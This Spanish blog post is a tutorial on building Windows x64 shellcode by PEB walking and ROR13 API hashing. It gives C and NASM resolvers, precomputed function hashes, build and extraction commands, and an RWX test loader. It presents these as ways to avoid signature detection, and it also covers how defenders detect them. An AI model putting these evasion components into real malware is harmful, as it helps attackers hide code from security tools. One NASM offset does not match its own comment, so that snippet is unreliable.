---
layout: single
title: "Shellcode Windows desde Cero: PEB Walking y API Hashing"
date: 2026-07-10
categories: [malware, reversing]
tags: [shellcode, windows, peb, api-hashing, asm, x86_64, offensive]
excerpt: "Cómo escribir shellcode position-independent en Windows: PEB walking para encontrar módulos cargados, resolución dinámica de APIs y hashing ROR13 para evitar strings en texto plano"
permalink: /malware/shellcode-windows-peb-walking-api-hashing/
---

Cualquier shellcode que use strings literales como `"kernel32.dll"` o `"CreateThread"` es detectable trivialmente con YARA o un grep. El enfoque estándar para evitarlo lleva décadas en el ecosistema ofensivo: resolver las funciones de la API de Windows en tiempo de ejecución, sin imports, sin strings, solo navegando estructuras internas del SO. Este post descompone ese proceso.

## Por qué el shellcode necesita ser PIC

Un PE normal tiene una IAT (Import Address Table) que el loader de Windows rellena antes de que el código empiece a ejecutarse. El shellcode no es un PE completo: se inyecta en memoria y se ejecuta directamente. No hay loader, no hay IAT, no hay sección `.data` reubicable de forma automática.

Eso implica dos restricciones:
- No puede hacer `call CreateRemoteThread` directamente — la dirección no existe en su namespace.
- No puede referenciar variables con direcciones absolutas porque no sabe dónde va a acabar.

La solución es **Position-Independent Code** combinado con resolución dinámica de APIs: el shellcode localiza `kernel32.dll` (y lo que necesite) en memoria usando estructuras del OS, luego extrae las direcciones de las funciones iterando el Export Directory.

## El PEB y la cadena de módulos cargados

El **Process Environment Block (PEB)** es una estructura por proceso que Windows mantiene en modo usuario. Contiene, entre otras cosas, la lista de módulos DLL cargados en ese proceso.

En x64, la dirección del TEB (Thread Environment Block) se encuentra en `gs:[0x30]`. Desde el TEB se accede al PEB:

```
TEB+0x60  →  PEB
PEB+0x18  →  PEB_LDR_DATA
PEB_LDR_DATA+0x20  →  InMemoryOrderModuleList (LIST_ENTRY)
```

La lista `InMemoryOrderModuleList` es una lista circular doblemente enlazada de estructuras `LDR_DATA_TABLE_ENTRY`. El orden típico es:
1. El ejecutable principal
2. `ntdll.dll`
3. `kernel32.dll`
4. Otros módulos

Acceder a `kernel32.dll` sin asumir posición tercera no es fiable — el orden puede variar según el contexto. Lo correcto es iterar la lista comparando el nombre del módulo.

## Estructura LDR_DATA_TABLE_ENTRY

```c
typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY  InLoadOrderLinks;
    LIST_ENTRY  InMemoryOrderLinks;     // +0x10
    LIST_ENTRY  InInitializationOrderLinks;
    PVOID       DllBase;               // base de la DLL en memoria
    PVOID       EntryPoint;
    ULONG       SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;        // nombre corto
    // ...
} LDR_DATA_TABLE_ENTRY;
```

El `DllBase` apunta al encabezado del PE en memoria, que es exactamente lo que se necesita para parsear el Export Directory.

## Export Directory: extrayendo direcciones de funciones

El Export Directory de un PE tiene tres arrays paralelos:

| Array | Tipo | Descripción |
|---|---|---|
| `AddressOfNames` | `DWORD[]` | RVAs a los strings de nombre |
| `AddressOfNameOrdinals` | `WORD[]` | Índice en AddressOfFunctions para cada nombre |
| `AddressOfFunctions` | `DWORD[]` | RVAs a las funciones exportadas |

Para resolver `"CreateThread"`:
1. Iterar `AddressOfNames` hasta encontrar el string.
2. Usar el índice `i` para leer `AddressOfNameOrdinals[i]` → ordinal.
3. Retornar `DllBase + AddressOfFunctions[ordinal]`.

El problema: comparar strings (`"CreateThread"`) deja ese string en el shellcode.

## API Hashing con ROR13

La técnica estándar es hashear el nombre de la función en lugar de compararlo directamente. El hash **ROR13** (rotate right 13 bits, acumular) es el más utilizado por su simpleza:

```python
def ror13(value, bits=32):
    return ((value >> 13) | (value << (bits - 13))) & 0xFFFFFFFF

def hash_name(name: str) -> int:
    h = 0
    for c in name:
        h = ror13(h)
        h = (h + ord(c)) & 0xFFFFFFFF
    return h
```

Para calcular los hashes de las funciones que se necesitan antes de escribir el shellcode:

```python
targets = ["LoadLibraryA", "CreateThread", "VirtualAlloc", "WaitForSingleObject"]
for name in targets:
    print(f"{name}: 0x{hash_name(name):08x}")
```

```
LoadLibraryA: 0xec0e4e8e
CreateThread: 0x835e515e
VirtualAlloc: 0xe553a458
WaitForSingleObject: 0x601d8708
```

Estos hashes van hardcodeados en el shellcode. En tiempo de ejecución se hashea cada nombre exportado y se compara contra la lista.

## Implementación en C (compilable sin imports)

El siguiente fragmento implementa la resolución completa. Se compila sin CRT ni imports del linker (`/GS- /NODEFAULTLIB`):

```c
typedef unsigned long long u64;
typedef unsigned int u32;
typedef unsigned short u16;

typedef struct {
    u16 Length;
    u16 MaximumLength;
    wchar_t *Buffer;
} UNICODE_STR;

typedef struct _LDR_ENTRY {
    void *Flink1[2], *Flink2[2];
    void *DllBase;
    void *EntryPoint;
    u32   SizeOfImage;
    UNICODE_STR FullDllName;
    UNICODE_STR BaseDllName;
} LDR_ENTRY;

static u32 ror13_hash(const char *name) {
    u32 h = 0;
    while (*name) {
        h = ((h >> 13) | (h << 19));
        h += (unsigned char)*name++;
    }
    return h;
}

void *resolve_api(void *dll_base, u32 target_hash) {
    unsigned char *base = (unsigned char *)dll_base;

    // DOS header → PE header
    u32 pe_off = *(u32 *)(base + 0x3C);
    unsigned char *pe = base + pe_off;

    // Export Directory RVA (DataDirectory[0])
    u32 exp_rva = *(u32 *)(pe + 0x88);
    if (!exp_rva) return 0;

    unsigned char *exp = base + exp_rva;
    u32  num_names = *(u32 *)(exp + 0x18);
    u32 *names     = (u32 *)(base + *(u32 *)(exp + 0x20));
    u16 *ordinals  = (u16 *)(base + *(u32 *)(exp + 0x24));
    u32 *funcs     = (u32 *)(base + *(u32 *)(exp + 0x1C));

    for (u32 i = 0; i < num_names; i++) {
        const char *fname = (const char *)(base + names[i]);
        if (ror13_hash(fname) == target_hash)
            return (void *)(base + funcs[ordinals[i]]);
    }
    return 0;
}

void *find_module(const wchar_t *name) {
    // Leer PEB desde GS:[0x60] en x64
    u64 peb;
    __asm__ volatile ("mov %%gs:0x60, %0" : "=r"(peb));

    // PEB+0x18 → PEB_LDR_DATA; +0x20 → InMemoryOrderModuleList
    void **ldr      = *(void ***)(peb + 0x18);
    void **list_head = (void **)(  (unsigned char *)ldr + 0x20);
    void **flink    = list_head[0];

    while (flink != list_head) {
        // BaseDllName está en LDR_ENTRY+0x58 (InMemoryOrder offset)
        LDR_ENTRY *entry = (LDR_ENTRY *)((unsigned char *)flink - 0x10);
        wchar_t *bname = entry->BaseDllName.Buffer;

        // Comparación case-insensitive simple
        int match = 1;
        for (int i = 0; bname[i] || name[i]; i++) {
            wchar_t a = bname[i], b = name[i];
            if (a >= L'A' && a <= L'Z') a += 32;
            if (b >= L'A' && b <= L'Z') b += 32;
            if (a != b) { match = 0; break; }
        }
        if (match) return entry->DllBase;
        flink = flink[0];
    }
    return 0;
}
```

## PEB Walking en ensamblador (x64)

Para entender qué genera el compilador (y para escribir shellcode raw en ASM), el walk del PEB en NASM:

```nasm
section .text
global _start

_start:
    ; PEB desde GS:[0x60]
    mov     rax, qword [gs:0x60]

    ; PEB_LDR_DATA → rax = PEB->Ldr
    mov     rax, [rax + 0x18]

    ; InMemoryOrderModuleList.Flink
    mov     rsi, [rax + 0x20]

    ; Primer módulo (ejecutable principal), saltar
    mov     rsi, [rsi]       ; .Flink del primer nodo

find_kernel32:
    ; BaseDllName.Buffer está en LDR_ENTRY+0x58 con InMemoryOrder offset
    mov     rdi, [rsi + 0x48]   ; BaseDllName.Buffer
    cmp     word [rdi], 'K'     ; comparación simplificada
    je      found
    mov     rsi, [rsi]          ; siguiente nodo
    jmp     find_kernel32

found:
    ; rsi apunta al nodo, DllBase en LDR_ENTRY+0x20 (InMemoryOrder)
    mov     rax, [rsi + 0x20]   ; DllBase de kernel32.dll
    ; → parsear Export Directory desde aquí
```

Nota: los offsets exactos dependen de la versión de Windows y si es un proceso de 32 o 64 bits. En x86 la dirección del PEB está en `FS:[0x30]`.

## Extracción del shellcode y prueba

Una vez compilado sin imports:

```bash
# Compilar con gcc (mingw en Linux)
x86_64-w64-mingw32-gcc -O2 -nostdlib -nodefaultlibs \
    -o shellcode.exe shellcode.c \
    -Wl,--entry=_start

# Extraer la sección .text con objcopy
objcopy --dump-section .text=shellcode.bin shellcode.exe

# Verificar que no hay strings evidentes
strings shellcode.bin | head -20

# Tamaño
wc -c shellcode.bin
```

Para probar localmente sin un loader completo:

```c
// test_loader.c — ejecutar en VM, nunca en producción
#include <windows.h>
#include <stdio.h>

int main() {
    FILE *f = fopen("shellcode.bin", "rb");
    fseek(f, 0, SEEK_END); long sz = ftell(f); rewind(f);

    void *mem = VirtualAlloc(0, sz, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    fread(mem, 1, sz, f);
    fclose(f);

    printf("[*] Ejecutando shellcode en %p\n", mem);
    ((void(*)())mem)();
    return 0;
}
```

## Limitaciones y detección

| Técnica defensiva | Efecto |
|---|---|
| Behavioral monitoring (EDR) | Detecta el patrón de PEB walk si genera excepciones o accede a estructuras poco frecuentes |
| ETW (Event Tracing for Windows) | `EtwEventWrite` puede registrar llamadas a APIs resueltas dinámicamente |
| Memory scanning | Heurísticas sobre RWX pages y patrones de shellcode |
| Import reconstruction (Scylla, etc.) | Reconstruye la IAT para análisis estático posterior |

El API hashing con ROR13 es conocido por productos de seguridad. Variantes más resistentes usan hashes custom, distintos seeds por compilación, o encriptan la tabla de hashes en lugar de dejarla en texto claro en el binario.

## Referencias

- [Windows Internals, 7th ed. — Russinovich et al.](https://learn.microsoft.com/en-us/sysinternals/resources/windows-internals)
- [Sektor7 — Malware Development Essentials](https://institute.sektor7.net/)
- [VX-Underground Papers — shellcode techniques](https://vx-underground.org/)
- Stephen Fewer — [Reflective DLL Injection](https://github.com/stephenfewer/ReflectiveDLLInjection) (origen del PEB walk moderno en malware)
- [al-khaser](https://github.com/LordNoteworthy/al-khaser) — reference implementation de técnicas anti-análisis
